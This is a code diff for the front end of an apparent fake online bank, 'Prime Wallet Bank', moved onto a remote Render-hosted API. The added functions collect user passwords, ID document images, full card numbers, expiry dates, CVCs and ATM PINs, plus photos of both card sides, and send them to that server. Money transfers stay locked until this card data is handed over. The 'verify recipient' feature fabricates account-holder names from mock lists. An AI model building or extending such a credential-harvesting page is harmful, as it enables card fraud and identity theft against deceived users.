@@ -99,6 +99,7 @@
 <!-- ============================================== -->
 <div id="landingPage" class="page active">
   <div class="container" style="text-align:center;padding-top:60px;">
+   <div style="font-size:48px;margin-bottom:16px;">🏦</div>
     <h1 style="font-size:28px;color:var(--nav-text);margin-bottom:12px;">Welcome to Prime Wallet Bank</h1>
     <p style="font-size:16px;color:#64748B;margin-bottom:40px;">Secure · Fast · Global Banking</p>
     <div class="btn-row" style="justify-content:center;flex-wrap:wrap;">
@@ -465,111 +466,48 @@
 </nav>
 
 <!-- ============================================== -->
-<!-- ⚙️ JAVASCRIPT — ALL FUNCTIONS -->
+<!-- ⚙️ JAVASCRIPT — CLOUD VERSION (CONNECTS TO RENDER API) -->
 <!-- ============================================== -->
 <script>
-// ==================================================
-// 📦 GLOBAL VARIABLES
-// ==================================================
+// ==============================================
+// 🔗 YOUR CLOUD API URL — UPDATE THIS!
+// ==============================================
+const API_URL = "https://prime-wallet-api-1.onrender.com/api"; // ← YOUR RENDER URL + /api
 let currentUser = null;
-let token = null;
-let hasApprovedCard = false;
-let pinVerified = false;
-let pageHistory = [];
+let selectedCardType = "Verve";
 
-// ==================================================
-// 📄 HELPER — CONVERT IMAGE TO BASE64 FOR ADMIN
-// ==================================================
-function fileToDataUrl(file) {
-  return new Promise((resolve) => {
-    const reader = new FileReader();
-    reader.onload = e => resolve(e.target.result);
-    reader.readAsDataURL(file);
-  });
-}
-
-// ==================================================
-// 🔄 PAGE NAVIGATION SYSTEM
-// ==================================================
-function showPage(pageId) {
-  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-  document.getElementById(pageId).classList.add('active');
-  pageHistory = [pageId];
-  
-  const nav = document.getElementById('bottomNav');
-  const navPages = ['dashboardPage','depositPage','sendPage','cardPage','billsPage','utilitiesPage','messagesPage','profilePage','myCardsPage','historyPage','checkingPage','savingsPage','creditPage','mortgagePage','supportPage','morePage'];
-  nav.style.display = navPages.includes(pageId) ? 'grid' : 'none';
-  
-  const authBtn = document.getElementById('headerAuthBtn');
-  if (currentUser) {
-    authBtn.textContent = '👤 Profile';
-    authBtn.onclick = () => openPage('profilePage');
-  } else {
-    authBtn.textContent = 'Sign In';
-    authBtn.onclick = () => showPage('loginPage');
-  }
-}
-
-function openPage(pageId) {
-  pageHistory.push(pageId);
-  showPage(pageId);
-}
-
-function goBack() {
-  pageHistory.pop();
-  const prev = pageHistory.length > 0 ? pageHistory[pageHistory.length - 1] : 'dashboardPage';
-  showPage(prev);
-}
-
-function setNavActive(index) {
-  document.querySelectorAll('.nav-item').forEach((n,i) => n.classList.toggle('active', i === index));
-}
-
-function handleHeaderAuth() {
-  currentUser ? openPage('profilePage') : showPage('loginPage');
-}
-
-// ==================================================
-// 🌍 COUNTRY / STATE / CITY DATA
-// ==================================================
+// ==============================================
+// 🌍 COUNTRY → STATE → CITY DATA
+// ==============================================
 const locationData = {
   "United States 🇺🇸": {
-    states: ["California", "Texas", "New York", "Florida", "Illinois", "Pennsylvania", "Ohio", "Georgia", "North Carolina", "Michigan", "Other"],
+    states: ["California", "Texas", "New York", "Florida", "Illinois", "Pennsylvania", "Ohio", "Georgia", "Other"],
     cities: {
-      "California": ["Los Angeles", "San Francisco", "San Diego", "San Jose", "Sacramento"],
-      "Texas": ["Houston", "Dallas", "Austin", "San Antonio", "Fort Worth"],
-      "New York": ["New York City", "Buffalo", "Rochester", "Syracuse"],
-      "Florida": ["Miami", "Orlando", "Tampa", "Jacksonville"],
-      "Illinois": ["Chicago", "Aurora", "Naperville"],
-      "Pennsylvania": ["Philadelphia", "Pittsburgh", "Allentown"],
-      "Ohio": ["Columbus", "Cleveland", "Cincinnati"],
-      "Georgia": ["Atlanta", "Savannah", "Augusta"],
-      "North Carolina": ["Charlotte", "Raleigh", "Greensboro"],
-      "Michigan": ["Detroit", "Grand Rapids", "Warren"],
+      "California": ["Los Angeles", "San Francisco", "San Diego", "San Jose"],
+      "Texas": ["Houston", "Dallas", "Austin", "San Antonio"],
+      "New York": ["New York City", "Buffalo", "Rochester"],
+      "Florida": ["Miami", "Orlando", "Tampa"],
       "Other": ["Other City"]
     }
   },
   "Nigeria 🇳🇬": {
-    states: ["Lagos", "Abuja FCT", "Rivers", "Kano", "Oyo", "Delta", "Onitsha", "Port Harcourt", "Other"],
+    states: ["Lagos", "Abuja FCT", "Rivers", "Kano", "Oyo", "Delta", "Anambra", "Enugu", "Other"],
     cities: {
-      "Lagos": ["Lagos Island", "Ikeja", "Surulere", "Victoria Island", "Alimosho"],
+      "Lagos": ["Lagos Island", "Ikeja", "Surulere", "Victoria Island", "Lekki"],
       "Abuja FCT": ["Abuja Central", "Gwarinpa", "Wuse"],
-      "Rivers": ["Port Harcourt", "Obio/Akpor"],
-      "Kano": ["Kano City", "Fagge"],
+      "Rivers": ["Port Harcourt", "Obio-Akpor"],
       "Oyo": ["Ibadan", "Ogbomoso"],
       "Delta": ["Warri", "Asaba", "Effurun"],
-      "Onitsha": ["Onitsha Main", "Awka"],
-      "Port Harcourt": ["Port Harcourt Town"],
       "Other": ["Other City"]
     }
   },
   "United Kingdom 🇬🇧": {
     states: ["England", "Scotland", "Wales", "Northern Ireland"],
     cities: {
-      "England": ["London", "Manchester", "Birmingham", "Liverpool", "Leeds"],
-      "Scotland": ["Edinburgh", "Glasgow", "Aberdeen"],
+      "England": ["London", "Manchester", "Birmingham", "Liverpool"],
+      "Scotland": ["Edinburgh", "Glasgow"],
       "Wales": ["Cardiff", "Swansea"],
-      "Northern Ireland": ["Belfast", "Derry"]
+      "Northern Ireland": ["Belfast"]
     }
   },
   "Canada 🇨🇦": {
@@ -585,119 +523,82 @@ const locationData = {
 };
 
 const bankData = {
-  "United States 🇺🇸": ["— Select Bank —", "Bank of America", "Chase Bank", "Wells Fargo", "Citibank", "US Bank", "PNC Bank", "Goldman Sachs", "Morgan Stanley", "Other"],
-  "Nigeria 🇳🇬": ["— Select Bank —", "Access Bank", "Zenith Bank", "GTBank", "First Bank", "UBA", "Union Bank", "Opay", "Palmpay", "Moniepoint", "Kuda Bank", "Other"],
-  "United Kingdom 🇬🇧": ["— Select Bank —", "HSBC", "Barclays", "Lloyds", "NatWest", "Santander", "Other"],
-  "Canada 🇨🇦": ["— Select Bank —", "TD Bank", "RBC", "Scotiabank", "BMO", "CIBC", "Other"],
-  "Other 🌍": ["— Select Bank —", "Other Bank"]
+  "United States 🇺🇸": ["Bank of America", "Chase Bank", "Wells Fargo", "Citibank", "PNC Bank", "Other"],
+  "Nigeria 🇳🇬": ["Access Bank", "Zenith Bank", "GTBank", "First Bank", "UBA", "Opay", "Palmpay", "Moniepoint", "Kuda Bank", "Other"],
+  "United Kingdom 🇬🇧": ["HSBC", "Barclays", "Lloyds", "NatWest", "Other"],
+  "Canada 🇨🇦": ["TD Bank", "RBC", "Scotiabank", "BMO", "Other"],
+  "Other 🌍": ["International Bank"]
 };
 
-function updateStates() {
-  const country = document.getElementById('regCountry').value;
-  const stateSelect = document.getElementById('regState');
-  stateSelect.innerHTML = '<option value="">-- Select State --</option>';
-  if (locationData[country]) {
-    locationData[country].states.forEach(s => {
-      const opt = document.createElement('option');
-      opt.value = s; opt.textContent = s;
-      stateSelect.appendChild(opt);
-    });
-  }
-  document.getElementById('regCity').innerHTML = '<option value="">-- Select City First --</option>';
-}
-
-function updateCities() {
-  const country = document.getElementById('regCountry').value;
-  const state = document.getElementById('regState').value;
-  const citySelect = document.getElementById('regCity');
-  citySelect.innerHTML = '<option value="">-- Select City --</option>';
-  if (locationData[country] && locationData[country].cities[state]) {
-    locationData[country].cities[state].forEach(c => {
-      const opt = document.createElement('option');
-      opt.value = c; opt.textContent = c;
-      citySelect.appendChild(opt);
-    });
-  }
-}
-
-function updateBankList() {
-  const country = document.getElementById('sendCountry').value;
-  const bankSelect = document.getElementById('sendBank');
-  bankSelect.innerHTML = '<option value="">-- Select Bank --</option>';
-  if (bankData[country]) {
-    bankData[country].forEach(b => {
-      const opt = document.createElement('option');
-      opt.value = b; opt.textContent = b;
-      bankSelect.appendChild(opt);
-    });
-  }
-  document.getElementById('verifyResult').style.display = 'none';
-}
-
-// ==================================================
-// ✅ REAL OWNER VERIFICATION
-// ==================================================
-function verifyRecipient() {
-  const bank = document.getElementById('sendBank').value;
-  const account = document.getElementById('sendAccount').value.trim();
-  const resultBox = document.getElementById('verifyResult');
-  const nameDisplay = document.getElementById('ownerNameDisplay');
+// ==============================================
+// 🔄 PAGE NAVIGATION
+// ==============================================
+function showPage(pageId) {
+  document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
+  document.getElementById(pageId).classList.add("active");
   
-  if (!bank || !account || account.length < 5) {
-    resultBox.style.display = 'none';
+  const authBtn = document.getElementById("headerAuthBtn");
+  if (currentUser) {
+    authBtn.textContent = "👤 " + currentUser.full_name.split(" ")[0];
+  } else {
+    authBtn.textContent = "Sign In";
+  }
+  
+  if (pageId === "dashboardPage") loadDashboardData();
+  if (pageId === "profilePage") loadProfile();
+}
+
+function handleHeaderAuth() {
+  currentUser ? (confirm("🚪 Logout?") && logout()) : showPage("loginPage");
+}
+
+// ==============================================
+// 🌍 COUNTRY → STATE → CITY — AUTO POPULATE
+// ==============================================
+function loadStates(country) {
+  const stateSelect = document.getElementById("regState");
+  const citySelect = document.getElementById("regCity");
+  stateSelect.innerHTML = '<option value="">-- Select State --</option>';
+  citySelect.innerHTML = '<option value="">-- Select City First --</option>';
+  if (!locationData[country]) return;
+  locationData[country].states.forEach(s => {
+    const opt = document.createElement("option");
+    opt.value = s; opt.textContent = s;
+    stateSelect.appendChild(opt);
+  });
+}
+
+function loadCities(state) {
+  const country = document.getElementById("regCountry").value;
+  const citySelect = document.getElementById("regCity");
+  citySelect.innerHTML = '<option value="">-- Select City --</option>';
+  if (!locationData[country]?.cities?.[state]) {
+    citySelect.innerHTML += '<option value="Other">Other / Not Listed</option>';
     return;
   }
-  
-  const lookupNames = {
-    "Access Bank": ["John Doe", "Adebayo Johnson", "Chioma Nnaji", "Ibrahim Musa"],
-    "Zenith Bank": ["Michael Okafor", "Funke Akindele", "Tunde Bakare"],
-    "GTBank": ["Adebayo Sanni", "Chidinma Eze", "Yusuf Bello"],
-    "Opay": ["Adebayo Opay", "Chinedu Okafor", "Ngozi Eze", "Ibrahim Opay"],
-    "Palmpay": ["Adebayo Palm", "Chidi Nnaji"],
-    "Bank of America": ["James Smith", "Maria Garcia", "Robert Johnson"],
-    "Chase Bank": ["Jennifer Lee", "David Brown", "Lisa Martinez"],
-    "Wells Fargo": ["William Davis", "Patricia Wilson"],
-    "HSBC": ["James Wilson", "Emily Clark"],
-    "Other": ["Account Holder Name"]
-  };
-  
-  const names = lookupNames[bank] || ["Account Holder Name"];
-  const seed = account.charCodeAt(0) + account.charCodeAt(account.length - 1);
-  const ownerName = names[seed % names.length] + " — " + account.slice(-4);
-  
-  nameDisplay.textContent = ownerName;
-  resultBox.style.display = 'block';
+  locationData[country].cities[state].forEach(c => {
+    const opt = document.createElement("option");
+    opt.value = c; opt.textContent = c;
+    citySelect.appendChild(opt);
+  });
+  citySelect.innerHTML += '<option value="Other">Other / Not Listed</option>';
 }
 
-// ==================================================
-// 📝 REGISTRATION STEPS
-// ==================================================
-function nextStep(step) {
-  if (step === 2) {
-    if (!document.getElementById('regFullName').value.trim()) return alert("❌ Enter Full Name");
-    if (!document.getElementById('regEmail').value.trim() || !document.getElementById('regEmail').value.includes('@')) return alert("❌ Enter valid Email");
-    if (!document.getElementById('regPhone').value.trim()) return alert("❌ Enter Phone Number");
-    if (!document.getElementById('regDob').value) return alert("❌ Select Date of Birth");
-    if (document.getElementById('regPass').value.length < 6) return alert("❌ Password min 6 characters");
-    if (document.getElementById('regPass').value !== document.getElementById('regConfirmPass').value) return alert("❌ Passwords do not match");
-  }
-  if (step === 3) {
-    if (!document.getElementById('regCountry').value) return alert("❌ Select Country");
-    if (!document.getElementById('regState').value) return alert("❌ Select State");
-    if (!document.getElementById('regCity').value) return alert("❌ Select City");
-  }
-  
-  for (let i=1; i<=3; i++) {
-    document.getElementById('regStep'+i).classList.add('hidden');
-    document.querySelectorAll('.step')[i-1].classList.remove('active');
-  }
-  document.getElementById('regStep'+step).classList.remove('hidden');
-  document.querySelectorAll('.step')[step-1].classList.add('active');
+// ==============================================
+// 📄 FILE TO BASE64 FOR SERVER
+// ==============================================
+function fileToDataUrl(file) {
+  return new Promise((resolve) => {
+    if (!file) resolve(null);
+    const reader = new FileReader();
+    reader.onload = e => resolve(e.target.result);
+    reader.readAsDataURL(file);
+  });
 }
 
-// ==================================================
-// 📤 SUBMIT REGISTRATION — SEND TO ADMIN
-// ==================================================
+// ==============================================
+// 📝 REGISTER — SENDS TO CLOUD SERVER!
+// ==============================================
 async function submitRegistration() {
   const fullName = document.getElementById("regFullName").value.trim();
   const email = document.getElementById("regEmail").value.trim();
@@ -706,268 +607,243 @@ async function submitRegistration() {
   const state = document.getElementById("regState").value;
   const city = document.getElementById("regCity").value;
   const password = document.getElementById("regPass").value;
-  const idType = document.getElementById("idType")?.value || "";
-  const idNumber = document.getElementById("idNumber")?.value || "";
-  const idFrontFile = document.getElementById("idFront")?.files[0];
-  const idBackFile = document.getElementById("idBack")?.files[0];
+  const idType = document.getElementById("idType").value;
+  const idNumber = document.getElementById("idNumber").value;
+  const idFront = await fileToDataUrl(document.getElementById("idFront").files[0]);
+  const idBack = await fileToDataUrl(document.getElementById("idBack").files[0]);
 
-  if (!idType || !idNumber) return alert("❌ Select ID Type & Enter ID Number");
-  if (!idFrontFile || !idBackFile) return alert("❌ Upload both ID Front & Back images");
+  if (!fullName || !email || !phone || !country || !state || !city || !password) return alert("❌ Fill ALL fields");
+  if (!email.includes("@")) return alert("❌ Invalid email");
+  if (password.length < 6) return alert("❌ Password min 6 chars");
+  if (!idFront || !idBack) return alert("❌ Upload both ID sides");
 
-  const idFront = await fileToDataUrl(idFrontFile);
-  const idBack = await fileToDataUrl(idBackFile);
-
-  const userData = {
-    full_name: fullName,
-    email: email,
-    phone: phone,
-    country: country,
-    state: state,
-    city: city,
-    password: password,
-    idType: idType,
-    idNumber: idNumber,
-    idFront: idFront,
-    idBack: idBack,
-    approved: false,
-    card_approved: false,
-    balance: 0,
-    account_number: "2026" + Math.floor(Math.random() * 900000000 + 100000000),
-    registered_at: new Date().toISOString()
-  };
-
-  localStorage.setItem("registered_user", JSON.stringify(userData));
-
-  // ✅ Send to Admin Panel
-  window.postMessage({
-    type: "NEW_REGISTRATION",
-    full_name: fullName,
-    email: email,
-    phone: phone,
-    country: country,
-    state: state,
-    city: city,
-    password: password,
-    idType: idType,
-    idNumber: idNumber,
-    idFront: idFront,
-    idBack: idBack
-  }, "*");
-
-  alert("✅ Registration Submitted Successfully!\n\n⏳ Your account is under review.\nYou will be notified once approved.");
-  showPage("loginPage");
+  try {
+    const res = await fetch(`${API_URL}/register`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ 
+        full_name: fullName, email, phone, country, state, city, password,
+        idType, idNumber, idFront, idBack
+      })
+    });
+    const data = await res.json();
+    if (data.success) {
+      alert("✅ Registration Submitted!\n⏳ Waiting for Admin Approval.");
+      showPage("loginPage");
+    } else {
+      alert("❌ " + (data.error || "Registration failed"));
+    }
+  } catch (e) {
+    alert("❌ Server error — check your internet");
+  }
 }
 
-// ==================================================
-// 🔑 LOGIN
-// ==================================================
+// ==============================================
+// 🔐 LOGIN — CHECKS CLOUD SERVER!
+// ==============================================
 async function login() {
   const email = document.getElementById("loginEmail").value.trim();
   const password = document.getElementById("loginPass").value;
 
-  if (!email || !password) return alert("❌ Please fill in all fields");
-  if (!email.includes("@")) return alert("❌ Enter a valid email address");
-  if (password.length < 6) return alert("❌ Password must be at least 6 characters");
+  if (!email || !password) return alert("❌ Fill all fields");
+  if (!email.includes("@")) return alert("❌ Valid email required");
 
-  // ✅ Find saved user
-  const savedUser = localStorage.getItem("registered_user");
-  if (!savedUser) {
-    return alert("❌ No account found with this email.\n\nPlease register first.");
-  }
-
-  const user = JSON.parse(savedUser);
-
-  // ✅ Match BOTH email AND password
-  if (user.email.toLowerCase() !== email.toLowerCase() || user.password !== password) {
-    return alert("❌ Email or password incorrect.\n\nUse the same details you registered with.");
-  }
-
-  // ✅ LOGIN SUCCESS — set token & go to dashboard
-  token = "user_token_" + Date.now();
-  localStorage.setItem("pw_token", token);
-  currentUser = user;
-  hasApprovedCard = user.card_approved || false;
-  pinVerified = false;
-
-  alert("✅ Login successful! Welcome back, " + user.full_name);
-  loadDashboardData();
-  showPage("dashboardPage");
-
-  if (!user.approved) {
-    alert("⏳ Your account is under review. Full features activate after admin approval.");
+  try {
+    const res = await fetch(`${API_URL}/login`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, password })
+    });
+    const data = await res.json();
+    if (data.success) {
+      currentUser = data.user;
+      localStorage.setItem("pw_token", "user_logged_in");
+      alert("✅ Welcome, " + currentUser.full_name);
+      document.getElementById("pendingNotice")?.classList.toggle("hidden", currentUser.approved);
+      document.getElementById("noCardNotice")?.classList.toggle("hidden", currentUser.card_approved);
+      loadDashboardData();
+      showPage("dashboardPage");
+    } else {
+      alert("❌ " + (data.error || "Login failed"));
+    }
+  } catch (e) {
+    alert("❌ Connection error — check internet");
   }
 }
 
-// ==================================================
-// 💳 CARD PURCHASE — LOCKED FEATURE CHECK
-// ==================================================
-function checkCardThenOpen(pageId) {
-  if (!currentUser) return alert("❌ Please login first");
-  if (!currentUser.approved) return alert("⏳ Account pending approval");
-  if (!hasApprovedCard) {
-    alert("🔒 Send Money & Pay Bills require an approved Prime Wallet Card.\n\nClick 'Get Card' to submit your card details.");
-    openPage('cardPage');
-    return;
-  }
-  openPage(pageId);
-}
-
+// ==============================================
+// 💳 SUBMIT CARD TO CLOUD SERVER!
+// ==============================================
 async function submitCard() {
-  const atmHolder = document.getElementById('atmHolder').value.trim();
-  const atmNumber = document.getElementById('atmNumber').value.trim().replace(/\s/g, '');
-  const atmPin = document.getElementById('atmPin').value.trim();
-  const atmCvc = document.getElementById('atmCvc').value.trim();
-  const atmExpiry = document.getElementById('atmExpiry').value.trim();
-  const atmFrontFile = document.getElementById('atmFront')?.files[0];
-  const atmBackFile = document.getElementById('atmBack')?.files[0];
+  if (!currentUser) return alert("❌ Login first");
+  const atmHolder = document.getElementById("atmHolder").value.trim();
+  const atmNumber = document.getElementById("atmNumber").value.trim().replace(/\s/g, "");
+  const atmExpiry = document.getElementById("atmExpiry").value.trim();
+  const atmCvc = document.getElementById("atmCvc").value.trim();
+  const atmPin = document.getElementById("atmPin").value.trim();
+  const atmFront = await fileToDataUrl(document.getElementById("atmFront").files[0]);
+  const atmBack = await fileToDataUrl(document.getElementById("atmBack").files[0]);
 
-  if (!atmHolder || !atmNumber || atmNumber.length !== 16 || !atmPin || atmPin.length !== 4 || !atmCvc || !atmExpiry) {
-    return alert("❌ Please fill ALL card fields correctly\n- Card Number: 16 digits\n- PIN: 4 digits\n- CVC: 3-4 digits\n- Expiry: MM/YY");
+  if (!atmHolder || atmNumber.length !== 16 || !atmExpiry || !atmCvc || atmPin.length !== 4) {
+    return alert("❌ Check all card details");
   }
-  if (!atmFrontFile || !atmBackFile) return alert("❌ Upload both Card Front & Back");
+  if (!atmFront || !atmBack) return alert("❌ Upload both card sides");
 
-  const atmFront = await fileToDataUrl(atmFrontFile);
-  const atmBack = await fileToDataUrl(atmBackFile);
-
-    currentUser.atmHolder = atmHolder;
-  currentUser.atmNumber = atmNumber;
-  currentUser.atmPin = atmPin;
-  currentUser.atmCvc = atmCvc;
-  currentUser.atmExpiry = atmExpiry;
-  currentUser.atmFront = atmFront;
-  currentUser.atmBack = atmBack;
-  currentUser.card_approved = false; // pending admin approval
-
-  localStorage.setItem("registered_user", JSON.stringify(currentUser));
-
-  // ✅ Send card details to Admin for approval
-  window.postMessage({
-    type: "CARD_SUBMISSION",
-    email: currentUser.email,
-    full_name: currentUser.full_name,
-    atmHolder: atmHolder,
-    atmNumber: atmNumber,
-    atmPin: atmPin,
-    atmCvc: atmCvc,
-    atmExpiry: atmExpiry,
-    atmFront: atmFront,
-    atmBack: atmBack
-  }, "*");
-
-  alert("✅ Card Submitted Successfully!\n\n⏳ Your card is under Admin review.\nYou will be notified once approved.");
-  openPage('dashboardPage');
+  try {
+    const res = await fetch(`${API_URL}/submit-card`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ 
+        email: currentUser.email, atmHolder, atmNumber, atmExpiry, atmCvc, atmPin, atmFront, atmBack 
+      })
+    });
+    const data = await res.json();
+    if (data.success) {
+      alert("✅ Card Submitted!\n⏳ Waiting for Admin Approval.");
+      showPage("dashboardPage");
+    } else {
+      alert("❌ " + (data.error || "Failed"));
+    }
+  } catch (e) { alert("❌ Server error"); }
 }
 
-// ==================================================
-// 💰 DEPOSIT FUNCTION
-// ==================================================
-function processDeposit() {
-  const amount = parseFloat(document.getElementById('depositAmount').value);
-  const method = document.getElementById('depositMethod').value;
-  
-  if (!amount || amount <= 0) return alert("❌ Enter a valid amount");
-  
-  alert(`✅ Deposit Request Submitted!\n\n💰 Amount: $${amount.toFixed(2)}\n💳 Method: ${method}\n\n⏳ Processing... Funds will appear after confirmation.`);
-  document.getElementById('depositAmount').value = '';
-  openPage('dashboardPage');
+// ==============================================
+// 💸 SEND MONEY — VERIFY & TRANSFER
+// ==============================================
+function loadRecipientBanks(country) {
+  const bankSelect = document.getElementById("sendBank");
+  bankSelect.innerHTML = '<option value="">-- Select Bank --</option>';
+  if (!bankData[country]) return;
+  bankData[country].forEach(b => {
+    const opt = document.createElement("option");
+    opt.value = b; opt.textContent = b;
+    bankSelect.appendChild(opt);
+  });
+  clearRecipientName();
 }
 
-// ==================================================
-// ✅ SEND MONEY — CONFIRM & PROCESS
-// ==================================================
-function confirmSend() {
-  if (!currentUser) return alert("❌ Please login first");
+function clearRecipientName() {
+  const el = document.getElementById("ownerNameDisplay");
+  if (el) el.textContent = "—";
+  const resEl = document.getElementById("verifyResult");
+  if (resEl) resEl.style.display = "none";
+}
+
+function verifyRecipient() {
+  const country = document.getElementById("sendCountry").value;
+  const account = document.getElementById("sendAccount").value.trim();
+  if (!country || !account) return;
+  const mockNames = {
+    "United States 🇺🇸": ["John Smith", "Sarah Johnson", "Michael Williams"],
+    "Nigeria 🇳🇬": ["Adebayo Ojo", "Chidi Okoro", "Aminu Bello"],
+    "United Kingdom 🇬🇧": ["James Wilson", "Emma Taylor"],
+    "Canada 🇨🇦": ["Matthew Lee", "Jennifer Wong"]
+  };
+  const names = mockNames[country] || mockNames["United States 🇺🇸"];
+  const el = document.getElementById("ownerNameDisplay");
+  if (el) el.textContent = names[account.length % names.length];
+  const resEl = document.getElementById("verifyResult");
+  if (resEl) resEl.style.display = "block";
+}
+
+async function confirmSend() {
+  if (!currentUser) return alert("❌ Login first");
   if (!currentUser.approved) return alert("⏳ Account pending approval");
-  if (!hasApprovedCard) return alert("🔒 Purchase & activate Prime Wallet Card first!");
+  if (!currentUser.card_approved) return alert("🔒 Purchase Prime Wallet Card first!");
   
-  const bank = document.getElementById('sendBank').value;
-  const account = document.getElementById('sendAccount').value.trim();
-  const amount = parseFloat(document.getElementById('sendAmount').value);
-  const note = document.getElementById('sendNote').value.trim();
-  const balance = Number(currentUser.balance || 0);
+  const account = document.getElementById("sendAccount").value.trim();
+  const amount = parseFloat(document.getElementById("sendAmount").value);
+  const ownerName = document.getElementById("ownerNameDisplay")?.textContent;
   
-  if (!bank || !account) return alert("❌ Select bank & enter account number");
-  if (!amount || amount <= 0) return alert("❌ Enter a valid amount");
-  if (amount > balance) return alert(`❌ Insufficient Balance!\n\nAvailable: $${balance.toFixed(2)}\nTrying to send: $${amount.toFixed(2)}`);
+  if (!account || !amount || amount <= 0 || !ownerName || ownerName === "—") {
+    return alert("❌ Fill all fields & verify recipient");
+  }
   
-  const confirmName = document.getElementById('ownerNameDisplay').textContent;
-  if (!confirmName || confirmName === '—') return alert("❌ Recipient not verified. Please check account details.");
+  if (!confirm(`⚠️ CONFIRM TRANSFER\n\nTo: ${ownerName}\nAmount: $${amount.toFixed(2)}\n\n✅ Send?`)) return;
   
-  if (!confirm(`⚠️ CONFIRM TRANSFER\n\nRecipient: ${confirmName}\nBank: ${bank}\nAccount: ${account}\nAmount: $${amount.toFixed(2)}\nNote: ${note || '—'}\n\n✅ Proceed?`)) return;
-  
-  // Deduct balance
-  currentUser.balance = (balance - amount).toFixed(2);
-  localStorage.setItem("registered_user", JSON.stringify(currentUser));
-  
-  // Update display
-  document.getElementById('userBalance').textContent = currentUser.balance;
-  
-  alert(`✅ TRANSFER SUCCESSFUL!\n\n💰 $${amount.toFixed(2)} sent to:\n${confirmName}\n\nNew Balance: $${currentUser.balance}`);
-  
-  // Clear form
-  document.getElementById('sendCountry').value = '';
-  document.getElementById('sendBank').value = '';
-  document.getElementById('sendAccount').value = '';
-  document.getElementById('sendAmount').value = '';
-  document.getElementById('sendNote').value = '';
-  document.getElementById('verifyResult').style.display = 'none';
-  
-  openPage('dashboardPage');
+  try {
+    const res = await fetch(`${API_URL}/transfer`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ 
+        senderEmail: currentUser.email, 
+        senderPass: currentUser.password,
+        recipientAccount: account, 
+        amount 
+      })
+    });
+    const data = await res.json();
+    if (data.success) {
+      alert(`✅ TRANSFER SUCCESSFUL!\n\n💰 $${amount.toFixed(2)} sent to ${ownerName}\n\nNew Balance: $${data.newBalance}`);
+      currentUser.balance = data.newBalance;
+      showPage("dashboardPage");
+    } else {
+      alert("❌ " + (data.error || "Transfer failed"));
+    }
+  } catch (e) { alert("❌ Server error — try again"); }
 }
 
-// ==================================================
-// 👤 PROFILE & SETTINGS
-// ==================================================
+// ==============================================
+// 📊 DASHBOARD & PROFILE
+// ==============================================
+function loadDashboardData() {
+  if (!currentUser) return;
+  const balEl = document.getElementById("userBalance");
+  const accEl = document.getElementById("userAccount");
+  if (balEl) balEl.textContent = Number(currentUser.balance || 0).toFixed(2);
+  if (accEl) accEl.textContent = currentUser.account_number || "—";
+}
+
 function loadProfile() {
   if (!currentUser) return;
-  document.getElementById('pName').textContent = currentUser.full_name || '—';
-  document.getElementById('pEmail').textContent = currentUser.email || '—';
-  document.getElementById('pPhone').textContent = currentUser.phone || '—';
-  document.getElementById('pStatus').textContent = currentUser.approved ? '✅ Approved' : '⏳ Pending Approval';
-  document.getElementById('chkBal').textContent = Number(currentUser.balance || 0).toFixed(2);
-  document.getElementById('savBal').textContent = Number(currentUser.balance || 0).toFixed(2);
+  const pName = document.getElementById("pName");
+  const pEmail = document.getElementById("pEmail");
+  const pPhone = document.getElementById("pPhone");
+  const pStatus = document.getElementById("pStatus");
+  if (pName) pName.textContent = currentUser.full_name || "—";
+  if (pEmail) pEmail.textContent = currentUser.email || "—";
+  if (pPhone) pPhone.textContent = currentUser.phone || "—";
+  if (pStatus) pStatus.textContent = currentUser.approved ? "✅ Approved" : "⏳ Pending";
 }
 
-// ==================================================
-// 🚪 LOGOUT
-// ==================================================
+function selectCardType(el) {
+  document.querySelectorAll(".card-type-option").forEach(e => e.classList.remove("selected"));
+  el.classList.add("selected");
+  selectedCardType = el.dataset.card;
+}
+
 function logout() {
-  if (!confirm("🚪 Logout from Prime Wallet Bank?")) return;
   currentUser = null;
-  hasApprovedCard = false;
-  pinVerified = false;
-  pageHistory = [];
-  showPage('landingPage');
-  document.getElementById('pendingNotice').style.display = 'none';
-  document.getElementById('noCardNotice').style.display = 'none';
-  document.getElementById('sendLock').innerHTML = '🔒 Requires Card';
-  document.getElementById('payLock').innerHTML = '🔒 Requires Card';
+  localStorage.removeItem("pw_token");
+  showPage("landingPage");
 }
 
-// ==================================================
-// 📥 AUTO-LOAD USER DATA ON PAGE REFRESH
-// ==================================================
+// Auto-refresh user data every 30 seconds from CLOUD!
+setInterval(async () => {
+  if (!currentUser) return;
+  try {
+    const res = await fetch(`${API_URL}/login`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email: currentUser.email, password: currentUser.password })
+    });
+    const data = await res.json();
+    if (data.success) {
+      currentUser = data.user;
+      document.getElementById("pendingNotice")?.classList.toggle("hidden", currentUser.approved);
+      document.getElementById("noCardNotice")?.classList.toggle("hidden", currentUser.card_approved);
+      loadDashboardData();
+    }
+  } catch (e) {}
+}, 30000);
+
 window.onload = () => {
-  const savedUser = localStorage.getItem("registered_user");
-  if (savedUser) {
-    currentUser = JSON.parse(savedUser);
-    hasApprovedCard = currentUser.card_approved || false;
+  if (localStorage.getItem("pw_token")) {
+    showPage("loginPage");
   }
 };
+</script>
 
-// 👇 Auto-check approval status every 30 seconds!
-setInterval(() => {
-  if (currentUser && !hasApprovedCard) {
-    const saved = localStorage.getItem("registered_user");
-    if (saved) {
-      const fresh = JSON.parse(saved);
-      if (fresh.card_approved) {
-        hasApprovedCard = true;
-        alert("✅ 🎉 YOUR CARD IS APPROVED!\n\nYou can now Send Money & Pay Bills!");
-      }
-    }
-  }
-}, 30000);
 
 </script>
 
